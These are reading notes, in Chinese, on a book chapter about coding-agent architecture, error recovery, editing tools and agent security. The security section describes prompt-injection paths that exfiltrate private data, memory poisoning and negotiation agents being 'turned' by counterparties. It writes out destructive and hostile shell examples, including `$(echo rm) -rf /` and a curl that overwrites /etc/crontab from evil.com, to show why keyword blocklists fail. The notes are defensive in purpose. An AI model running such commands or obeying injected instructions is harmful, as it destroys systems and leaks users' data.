# 《深入理解 AI Agent》读书笔记｜第 5 章 Coding Agent 与通用 Agent


## 1. 通用 Agent 的内核：Coding Agent + 文件系统

第 5 章要回答的问题是，一个能处理任意任务的通用 Agent，架构长什么样。书里的答案是：以开放任务为目标的通用 Agent，核心是一个 Coding Agent 加上文件系统，从 Manus 到 OpenClaw 都是这个范式。原因是代码生成不只是一个工具，而是一种元能力，能在运行时创造出新的工具和能力。代码对 Agent 的价值有两层：思考上，"年龄大于 18 且已实名认证"用自然语言说可能有几种理解，写成代码就没有歧义；表达上，一段能跑通的代码本身就证明了逻辑自洽，执行结果给出客观的对错标准。

书里认为，具备基本的 coding 能力不需要复杂的架构，七个核心工具就够了：代码解释器、Bash、读文件、写文件、编辑文件、按文件名搜索（Glob）、按内容搜索（Grep）。它们主要覆盖第 4 章五类工具里的感知和执行。比如"把项目里所有 TODO 注释整理成一个清单"，只需要 Grep 搜一遍、Write 写个文件。工具也可以更少，OpenAI Codex 只用 shell 作为唯一的通用执行入口，文件修改交给一个语法受约束的 `apply_patch` 工具。

为什么核心是 Coding，而不是 Deep Research 或 Computer Use？书里的理由是，高效的内容生成最终几乎都落到代码上：PPT、Word 本质上是 OOXML 格式的代码，PDF 报告可以由 Markdown、HTML 或 LaTeX 生成，数据分析用 Python，连成功的浏览器操作序列也能固化成代码。Computer Use 通用性更强，但成本、延迟和稳定性都不如直接用代码或 API。

文件系统在这个架构里是中枢。OpenClaw 的长期记忆存在 `MEMORY.md` 和按日期归档的 Markdown 日志里，选 Markdown 而不是向量数据库，是因为用户能直接打开修改，时间顺序天然保留，还能用 Git 回滚。Agent 有了写文件的能力，就可以把新发现记下来，比如给某家银行打电话时，发现对方要开户行地址才能验证身份。不过书里也说明，一条记录什么时候能成为可靠的知识或程序，还要靠更多轨迹和结果来验证，那是第 9 章的问题。

这个判断也有适用边界。它主要针对深度调研、内容生成、数据处理这类任务边界不确定的场景；垂直领域的客服 Agent 任务空间相对封闭，架构围绕固定的业务流程搭建，代码只是工具箱里的一件工具，但精确计算、规则校验仍然离不开它。


## 2. Coding Agent 的工作方式：工程化流程 + Harness 实践

### 推荐的工作流程

书里给的流程和一个新入职的工程师很像。第一步是项目文档化，关键文档缺失时，先读代码库，把架构、目录结构、测试方法写成文档，再动手。现在这一步有了面向 Agent 的形态，就是 CLAUDE.md、AGENTS.md、.cursorrules 这类项目指令文件，每次会话开始时自动注入，写的是构建和测试命令（比如"用 `pnpm test` 而不是 `npm test`"）、代码风格、明确的禁区。它内容稳定，天然对 KV Cache 友好。书里由此给了一个衡量团队是否"AI-ready"的指标："一个远程新人只靠代码仓库和文档，能不能独立开展工作。"

之后是需求澄清、写设计文档、实现与测试。简单的 bug 可以直接改；"优化系统性能"这类模糊的需求，要先搞清目标是降延迟、省内存还是提吞吐，能接受哪些权衡。设计文档写完先交给用户审，审几段设计比审几百行代码容易得多。实现后进入"测试-修复"循环，测试失败要自己分析原因、改到通过。书里指出，Coding Agent 最常见的偷懒，就是写完代码不跑测试就报告完成，所以完成标准应该是测试通过，而不是代码写完。测试通过后还要做一次审查，涉及架构变化时同步更新文档，因为过时的文档比没有文档更糟。

现实中的 Claude Code、Codex 会按需裁剪这套流程。书里还提到，不同模型裁剪的方式不一样：有的改动前先广泛阅读，有的读几个文件就提交补丁，再把编译和测试的反馈当作调查的一部分。这个"何时停止收集信息、开始行动"的阈值，首先是模型学到的行为策略，第 7、8 章会再讨论。

### Harness 实践

在 Coding 场景里，Harness 落到四类具体的组件：验收基线（测试、CI、审查标准），执行边界（模块边界、依赖规则、权限），反馈信号（linter、测试结果、类型检查），回退手段（Git、沙盒、快照）。

书里用任务清晰度和验证自动化两个维度把任务分成四种状态：目标明确又能自动验证，是 Agent 发挥最好的区域，比如修复有测试用例的 bug；目标明确但要人工验收，吞吐量受限于人的审查速度；有自动反馈但目标模糊，比如用 linter 优化"代码质量"，会高效地跑偏；两者都缺，比如"让 UI 更好看"，很难启动。写代码天然处在最好的那个象限。书里的结论是，Coding Agent 成熟度最高，不是因为代码模型特别强，而是软件工程几十年积累的测试、类型系统、版本控制天然构成了一套 Harness。

由此可以得到四条通用原则：约束优先于指导，能用 linter、类型、CI 强制的规则就不要写在提示词里，前者是"做不了"，后者只是"建议别做"；验证要自动化；反馈越快、越结构化越好；回退要可靠，Agent 在安全网里才能大胆试错。

约束还有另一层作用，就是管过程。修数据库故障时直接删库重建，修编译错误时把代码全删了重写，结果都"生效"了，但这是破坏性的捷径，也是第 8 章 reward hacking 在 Agent 任务里的日常形态。所以 Harness 要对 `rm -rf`、删除生产数据、覆盖没读过的文件这类动作单独设检查和审批，约束的是动作，而不只是结果。

并行调用工具时，还要控制故障的传播范围：同时读三个文件，一个找不到，只报告这一个失败，不取消另外两个，更不让整个任务中止。


## 3. 故障与错误恢复：先分类 + 分级恢复 + 跨厂商接管 + 每条路径都有上限

书里认为这是最能拉开工程差距的一块，分析基于 Claude Code 等生产级实现。

### 先分类，再计数

故障按发生的位置分四层：API 层，比如限流、过载、超时、输出被截断；工具层，比如调用不存在的工具、参数不合法，以及最危险的，工具反复返回同一个错误而模型原样重试；上下文层，比如窗口溢出、压缩失败、工具调用缺少配对的结果；控制流层，包括死循环和死亡螺旋。

捕获故障后，第一个判断不是要不要重试，而是值不值得重试。限流、网络抖动重试才有意义；参数不合法、权限不足，重试多少次都一样，必须改输入或换策略。所以要维护一张错误到恢复策略的映射表。单次错误之外还要看模式：对"工具名 + 参数"计算指纹，相同指纹反复出现就是陷入循环的信号；每条恢复路径各自统计连续失败次数。

还有一类故障不表现为错误。流式连接最危险的不是断开，而是连着但不出数据，SDK 的超时往往只管建立连接，所以要有独立的空闲看门狗。书里总结为一条原则："每个长连接都需要活性信号，而非仅依赖连接超时"。

### 分级恢复

恢复按对用户透明的程度分级，能低级别解决就不升级：

1. 静默重试：指数退避加随机抖动，尊重服务端给的等待时间；主循环的请求要重试，生成标题这类后台辅助调用失败就直接放弃，免得挤占主链路的配额。
2. 降级与接续：输出被截断时，先提高输出上限重发，不够再让模型从断点接着写；主模型持续过载时切到备用模型。
3. 暴露给用户：自动手段都用完了才报错，同时说明已经尝试过哪些恢复。

工具层的错误走另一条路，不终止会话，而是把结构化的错误信息作为工具结果交给模型，让它下一轮自己改。核心原则是，错误处理的边界是整个恢复循环，确认无法恢复之前，不把中间的错误暴露给用户或下游系统。

### 跨厂商接管

主模型持续不可用时，要换一家模型把轨迹接着跑完。难点在模型的思考：它由可读的文字和厂商附上的凭证组成，凭证证明这段思考出自它自己。书里的说法是："跨厂商接管能带走的是文字，带不走的是凭证"。各家对凭证的要求还不一样，有的不校验，有的拒绝一切别家签发的凭证，有的凭证附在工具调用上，所以方案只能按最严格的一家来设计，实在不行就把历史工具调用改写成文字叙述。

由此得到一条设计原则：轨迹不按任何一家的接口格式存，而是存成中立格式，思考拆成可移植的文字和不可移植的凭证，工具调用只记名称和参数，标识符在发请求时按目标厂商重新生成。这份中立轨迹也是第 7 章评估重放、第 8 章构造训练样本、第 9 章提取经验共用的材料。

### 每条恢复路径都要有上限

恢复机制本身也会失效，所以每条路径都要有熔断上限，阈值来自生产数据。书里的例子是 Claude Code 的上下文压缩熔断设为"连续 3 次"：曾有一个会话在这条路径上连续失败三千余次，这类无效重试每天在全球浪费约 25 万次 API 调用。

更隐蔽的是死亡螺旋，错误处理逻辑自己又调用 LLM，再次出错，连锁反应。书里的真实案例是：Agent 因上下文溢出停止，触发结束时自动提交代码的钩子，钩子调用 LLM 生成 commit message，又一次溢出，又触发钩子。防护办法是在错误路径上禁用一切会再次调用模型的副作用逻辑，用递归深度计数器打断残余的连锁，最上面再加最大轮数、会话预算和转人工这几道全局终止条件。


## 4. 实现细节：五个实现技巧 + 搜索工具 + 编辑工具

### 五个实现技巧

一是并行与流式。第一个工具调用的参数一生成完、通过校验，就可以开始执行，不用等后面的调用生成完；互相独立的调用并行执行。每个工具要声明自己能否并发，默认不能。

二是精细的上下文管理。读文件支持按行号范围读，返回内容时每行带上实际行号，模型就能精确引用第几行，后续编辑也更可靠；命令的长输出保留头尾、中间省略，完整内容存到临时文件。

三是环境信息动态注入。当前工作目录、git 分支、最近的提交、暂存和未暂存的变更，以状态栏的形式追加在上下文末尾，不写死在系统提示词里，以免破坏 KV Cache。

四是终端状态持久化。每条命令都开一个新 shell 的话，`cd` 过的目录、激活的虚拟环境都会丢，所以默认维护一个持久化的终端会话。

五是即时语法反馈。文件一写完，工具层就自动跑 linter，把结果放进返回值，就像 IDE 里打错括号立刻画红线。

### 搜索工具

书里比较了四种搜索方式：grep 做文本和正则匹配，知道要找什么时又快又准，但理解不了语义；glob 只按路径找文件，速度最快，是探索项目结构的第一步；语义搜索要按函数、类这样完整的语法单元分块，再用第 3 章的混合检索；符号级的定义与引用查找能区分同名符号的定义和调用，但主流 coding agent 目前没有采用。

要不要为语义搜索建嵌入索引，业界有过路线之争。Claude Code 刻意不建索引，靠 grep 加 glob 现场检索，不用维护随代码变化而过时的索引；Cursor 早期愿意为跨文件的语义召回付出建索引的成本，但成书时也改成了 grep 加 glob 现场检索。

### 编辑工具

文件编辑的难点在于，怎么让模型高效又可靠地说清"改哪里、怎么改"。书里比较了五种方案：

- 差异描述加应用模型：主模型写类似 diff 的变更描述，由一个更小的模型合并进文件，难点在合并时可能对错位置。Cursor 是代表，但随着基础模型变强也不用了。
- 旧字符串替换成新字符串：Claude Code、Codex 和现在的 Cursor 用的方案。旧字符串在文件里存在且唯一就成功，否则失败，结果可预测；代价是删大段代码时要把原文完整输出，差一个字符就匹配失败。
- 行号定位：大段删除只要首尾两个行号，但每次编辑后行号都会变，一次输出多处编辑时，要统一用编辑前的行号。
- 类 Vim 命令：重组代码很高效，但小模型错误率高。书里更深一层的看法是，编辑器是为人设计的，人要不断看到当前状态再做下一步的小操作；而模型的工作方式是长时间思考后，批量做较复杂的修改。
- 首尾匹配：旧字符串方案的改进，只给要删内容的开头几行和结尾几行，中间省略，首尾组合唯一就能定位，兼顾了可靠性和效率。


## 5. Coding Agent 的安全：致命三要素 + 沙盒 + 语义解析 + 忠诚度

### 致命三要素

Simon Willison 把这类风险概括为致命三要素：能访问私有数据，会接触不受信任的内容，具备对外通信能力。三者齐备时，攻击路径就闭合了：恶意指令藏在不可信的内容里进入 Agent，驱使它读取私有数据，再从对外通道传出去。书里补充了第四个维度，持久记忆，它不是必要条件，而是放大器，攻击者可以把恶意指令写进长期记忆，跨会话潜伏。OpenClaw 这样的全权限本地 Agent 四点俱全。

所以 Claude Cowork 这类商业产品选择了保守的权限策略。书里的看法是，单靠输入过滤挡不住提示注入，重点不是识别所有攻击，而是让 Agent 即使被注入了，也没有机会把危险动作真正执行出去。写入长期记忆的内容，也要和外部内容一样经过信任审查。

### 沙盒

代码执行是 Coding Agent 特有的攻击面，书里列了三项要求。网络出口控制最容易被忽视，也最关键：默认断网，只通过白名单代理放行包管理源、文档站点这些必要的目的地，这样即使恶意代码读到了敏感数据，也传不出去。文件系统方面，源码只读挂载，另设一个可写工作区，`~/.ssh`、密钥、token 这类凭证根本不挂进沙盒。资源方面，限制 CPU、内存、磁盘和执行时间，超时要返回结构化的错误，而不是静默杀掉进程，让 Agent 下一轮能调整。

### 语义解析而非关键字黑名单

Shell 命令可以通过管道、子 shell、变量展开绕过静态规则，比如禁了 `rm`，还能写成 `$(echo rm) -rf /`。`find / -name '*.log' -exec rm {} \;` 借合法的 find 嵌入了删除，`curl -o /etc/crontab http://evil.com/payload` 看似下载文件，实际覆盖了系统定时任务。所以生产级 Harness 要理解每个命令的参数怎么消费，在语义层判断命令的真实效果。

### Agent 为谁效忠

还有一类更微妙的问题：Agent 到底站在谁那一边。模型在训练中形成的默认原则是"谁在跟我说话，我就尽力帮谁"，但替你砍价的 Agent，对面坐的是交涉对手，对手一开口就可能把它策反。书里引用的实测显示了一条忠诚度光谱，两端都会出问题：太老实，会把"我方底价是 12000"这种私密信息直接告诉对手，被施压几轮就让步；太多疑，连主人正当的请求也拒绝。两者像跷跷板，很难兼顾。

对 Coding Agent 来说，仓库里读到的不可信内容、工具输出、第三方 MCP 服务器发来的指令，都是想让它倒戈的"对手"，书里的说法是："提示注入本质上就是一次策反"。所以 Harness 要明确主人的指令优先级最高，外部内容一律只当作参考数据，不具备指令效力。书里给的守则包括：保护主人的私密信息，连这些信息是否存在都不透露；拒绝时不逐条念出拒绝清单；私下的底线不等于对外的立场；只执行主人明确、具体的指令；顶住重复施压。


## 6. 代码作为元能力：思考工具 + 业务规则约束 + 多媒体生成

书里把元能力定义为能创造其他能力的能力：Agent 当场写出新工具、新约束、新的表达形式来完成任务，而不是事先预制好所有能力。后半章按作用对象由内向外展开了六个方向：思维本身、业务规则、内容呈现、系统接口、用户界面、Agent 自身。

### 思考工具

模型的思考是概率性的、近似的，做不好精确计算和严格推理。书里的例子是：40 个学生，60% 选数学，45% 选物理，25% 两门都选，问只选物理的有多少人。用自然语言推理容易从数学人数里去减，得出 14；写成代码，物理人数减两门都选的，结果是 8。分工是模型负责理解问题、写出代码，解释器负责精确计算。书里也引用了 Stephen Wolfram 的观点：符号计算引擎能精确计算，但自然语言理解很脆弱，LLM 正好补上这一块，把问题转成 SymPy 或 Mathematica 这样的形式化语言，再交给引擎求解。

实验 5-4 用约束求解库解骑士与无赖谜题。书里从中引出一个更普遍的规律：模型和脚手架此消彼长。模型足够强时，自己就能把逻辑想对，代码求解器的增益收窄到接近零；模型弱时，才需要把关键推理交给代码，所以实验刻意选了较弱的模型。同一套脚手架配上不同能力的模型，得到的结论可能完全不同，这是评估 Agent 技术时容易忽视的前提。

### 业务规则约束

自然语言的规则充满歧义，"购买后 7 天内可退款"里，7 天是自然日还是工作日，购买是指下单还是发货？书里的建议是两者结合：系统提示词里写自然语言规则，方便模型向用户解释政策、寻找变通方案；关键的决策点配备代码化的校验，守住取消订单、转出资金、删除数据这类不可逆的操作。

书里用 τ-bench 航空客服的取消预订举例，把校验合并进执行工具。第一层是参数作为 checklist：工具描述里列出完整的取消政策，再加几个可选的 `expected_*` 参数，让模型写出自己判断的舱位、是否买了保险。为了填这些参数，模型得先查订单逐条核对，往往在准备调用时就发现经济舱没买保险不能取消，于是不发起调用，直接告诉用户，并建议先买保险再取消或者改签。第二层是服务端的真值校验：舱位、保险、预订时间、航段使用情况一律从数据库读，当前时间用服务端时钟，模型自报的值从不当作事实，和真值不一致时记录告警，用来发现模型的错误认知或注入。书里强调，最后一道防线必须建立在模型无法伪造的数据之上，独立性不只是独立的模型，还指独立的数据来源。

实验 5-5 用 Qwen3-4B 在这个场景下对比纯自然语言规则和这三重保障，书里写的是预期结果：实验组显著更好。

### 多媒体生成

PPT、视频这类内容，用代码生成比让 Agent 操作 GUI 精确得多。PPT 可以用 Slidev 这种用 Markdown 和 HTML 定义幻灯片的框架。问题是 Agent 写完代码并不知道渲染效果，所以要用提议者—审核者机制：Proposer 写 Slidev 代码；Reviewer 把每页渲染成图片，用多模态模型检查，给出带页码、问题类型、严重程度的结构化建议，比如"第 3 页：内容过多，建议拆分"；迭代到质量达标或达到最大轮数（比如 5 轮），这正是 Loop 工程要求的两类显式终止条件。

这和第 4 章的事前审批是同一个模式，区别在于这里是多轮改进内容质量，审核者还能看到提议者看不到的新信息，也就是渲染结果。书里认为用两个 Agent 而不是一个 Agent 自查，核心优势在上下文管理：Reviewer 每次只看最新版本的渲染图，Proposer 只累积文字反馈；单个 Agent 要在同一个上下文里堆积多轮几十页的截图，很快就超限了。

视频剪辑也一样，Blender、FFmpeg 都有程序化接口，把"把冲浪部分剪出来"转成 API 调用，比模拟鼠标点击时间轴容易得多。定位片段用两步：先每 10 秒截一张图粗定位，再在缩小的范围内每秒一张图精确定位，并且把视频分析封装成子 Agent，免得大量截图占满主 Agent 的上下文。

做 3D 零件时，是写代码构造，还是调 3D 生成模型？书里给的判断方法是看两点：产物有没有紧凑的精确描述，以及精度要求和可验证性。法兰盘五六个参数就能完整定义，代码是它的无损表达，尺寸也能程序化核对；一盆绿植的细节近乎无限，更适合生成模型。还有可编辑性的差别，等甲方说"安装孔从 M5 改成 M6"，代码改一个数字重跑就行，生成模型只能整个重新生成，其余尺寸会不会跑偏全凭运气。两条路也可以混用，几何体用代码，表面纹理交给生成模型。


## 7. 代码连接系统与用户：系统适配器 + 生成式 UI + Agent 自举

### 系统适配器

外部服务常常没有现成的 SDK，文档缺失、返回格式不规范、字段随版本漂移。Agent 可以读文档或者看一两条真实响应，当场生成客户端、鉴权和解析代码，书里称之为连接任意系统的"万能胶"。完全没有 API 的系统，可以先用 Computer Use 操作界面，再把成功的操作序列固化成 RPA 代码，第 9 章展开。

两个具体的应用。一是自适应的日志解析：前端遇到解析不了的日志格式时，不显示错误，而是把日志样本和报错发给 Agent，Agent 生成新的解析代码，在虚拟浏览器里测试通过后热更新到前端。二是生产日志诊断：Agent 读取生产轨迹，结合架构文档和 PRD 判断执行是否符合预期，生成结构化的问题报告，以及引用轨迹 ID 和交互轮次的回归测试，再通过 MCP 在 GitHub 上建 Issue。

### 生成式 UI

纯文本交互在很多场景下效率很低，Agent 可以动态生成表单、图表甚至完整的应用。安全问题在于，Agent 被提示注入后可能生成窃取数据的脚本。书里特意区分了因果：成因是提示注入，在浏览器里执行恶意脚本的效果类似 XSS。A2UI 这类声明式协议的做法是，Agent 只输出一份 JSON 格式的界面描述，客户端用预先准备好的受信任组件来渲染，就像顾客只能点菜单上的菜，不能进厨房自己做。书里还提醒，名字相近的 AG-UI 不是界面描述语言，而是把 Agent 的执行状态推送到前端的事件和传输协议，两者是互补的。高度定制的界面，直接生成代码仍然更灵活。

几个应用场景：用 HTML 交付成果，取代一页页往下翻的 Markdown 汇报，可以交互演示、用图表展示数据，还能在工作推进中持续完善；用动态表单澄清意图，比如"我想订一张去北京的机票"，生成一张包含出发城市、日期、单程或往返的表单，选了往返才显示返程日期，用户一次填完，不用一个问题一轮地来回问；生成 SQL 时用 Artifact 模式，模型只写查询语句，系统直接执行并渲染结果，模型不用读几千行数据再复述，又快又不会抄错。书里同时强调："Artifact 模式缩短了数据路径，但不能替代权限检查与执行隔离"，执行层要用只读账号，只允许批准过的 `SELECT`，参数由服务端绑定，并限制时间和返回行数。

### 动态生成软件与数据层信任边界

Agent 还能从零生成软件，或者在已有框架上按用户的要求修改界面，热加载即时生效。但这改变了安全的前提。过去权限判断写在应用层，业务代码经过审查后相对稳定；现在接口和数据访问代码由 Agent 随时生成，可能漏掉一项权限检查，或者绕开已有的判断。所以书里认为安全目标应该是："即使 AI 写错了代码，权限约束仍然无法被绕过"。做法是把信任边界下移到数据层：行级安全策略、约束和校验器、受控视图，以及由受信任运行时绑定的访问上下文，生成的代码只能以受限的身份访问数据，拿不到能绕过规则的高权限凭证。应用层仍然可以先做权限预检，及早给用户反馈，但最终裁决权在数据层，而且所有数据访问都必须经过这一层。

### Agent 自举

元能力推到最后，就是 Agent 用代码修复和创造 Agent。OpenClaw 的 `doctor` 命令能检测配置异常、状态问题和服务健康问题，安全的修复自动执行，服务重启这类有风险的操作要用户确认。书里特别提醒不要夸大 Agent 在这里的作用：过期 token、锁文件、端口冲突这些高频问题，靠的是一组确定性检查，和传统运维脚本没有本质区别；LLM 负责的是规则没覆盖到的长尾问题。

让 Agent 编写 Agent，常见的缺陷有：把轨迹转成纯文本塞进上下文，工具描述简略、缺少边界说明，选用训练数据里常见但已经过时的模型和 API，使用废弃的库。书里认为最有效的办法不是在提示词里穷举规则，而是提供一份高质量的 Agent 实现作为范例，让 Agent 先复制，再改系统提示词、工具和业务逻辑，保留架构框架，就像基因复制加变异。

书里对这一章的总结是，代码既是完成任务的手段，也是积累知识、创造工具、优化自身的机制。
